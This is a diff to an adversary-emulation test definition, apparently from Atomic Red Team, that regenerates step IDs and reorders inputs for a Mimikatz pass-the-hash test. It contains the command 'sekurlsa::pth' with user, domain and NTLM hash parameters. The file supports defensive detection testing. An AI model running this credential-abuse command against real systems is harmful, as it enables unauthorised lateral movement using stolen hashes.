@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "49aa986c-63c3-4c5a-923e-460a4439897d",
+      "id": "a01e9a22-4af4-48f0-9161-dc002728916c",
       "type": "execute-command",
       "data": {
         "command": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "fc509ee7-1a16-4cf8-b6d0-e100cf22ebde",
+      "id": "0d33c40c-d786-4994-ab53-145660f5bd2c",
       "name": "Check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "136582fa-46b3-4b85-97a3-0c7ad87240c6",
+      "id": "876044dc-af02-4bbc-a534-ba54a079bbd4",
       "name": "Resolve dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "ce430919-685b-4db7-b26d-6bd68a348e2f",
+      "id": "2f9cd0e5-9d92-43f9-9a38-ed69890fb5e8",
       "name": "Re-check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "fc509ee7-1a16-4cf8-b6d0-e100cf22ebde",
+      "s": "0d33c40c-d786-4994-ab53-145660f5bd2c",
       "p": "on-success",
-      "o": "49aa986c-63c3-4c5a-923e-460a4439897d"
+      "o": "a01e9a22-4af4-48f0-9161-dc002728916c"
     },
     {
-      "s": "fc509ee7-1a16-4cf8-b6d0-e100cf22ebde",
+      "s": "0d33c40c-d786-4994-ab53-145660f5bd2c",
       "p": "on-failure",
-      "o": "136582fa-46b3-4b85-97a3-0c7ad87240c6"
+      "o": "876044dc-af02-4bbc-a534-ba54a079bbd4"
     },
     {
-      "s": "136582fa-46b3-4b85-97a3-0c7ad87240c6",
+      "s": "876044dc-af02-4bbc-a534-ba54a079bbd4",
       "p": "on-success",
-      "o": "ce430919-685b-4db7-b26d-6bd68a348e2f"
+      "o": "2f9cd0e5-9d92-43f9-9a38-ed69890fb5e8"
     },
     {
-      "s": "ce430919-685b-4db7-b26d-6bd68a348e2f",
+      "s": "2f9cd0e5-9d92-43f9-9a38-ed69890fb5e8",
       "p": "on-failure",
-      "o": "49aa986c-63c3-4c5a-923e-460a4439897d"
+      "o": "a01e9a22-4af4-48f0-9161-dc002728916c"
     }
   ],
   "tags": [
@@ -76,6 +76,12 @@
     "atomic-red-team"
   ],
   "input_arguments": [
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "domain",
+      "value": "%userdnsdomain%"
+    },
     {
       "name": "mimikatz_path",
       "type": "path",
@@ -93,12 +99,6 @@
       "type": "string",
       "description": "ntlm hash",
       "value": "cc36cf7a8514893efccd3324464tkg1a"
-    },
-    {
-      "name": "domain",
-      "type": "string",
-      "description": "domain",
-      "value": "%userdnsdomain%"
     }
   ]
 }
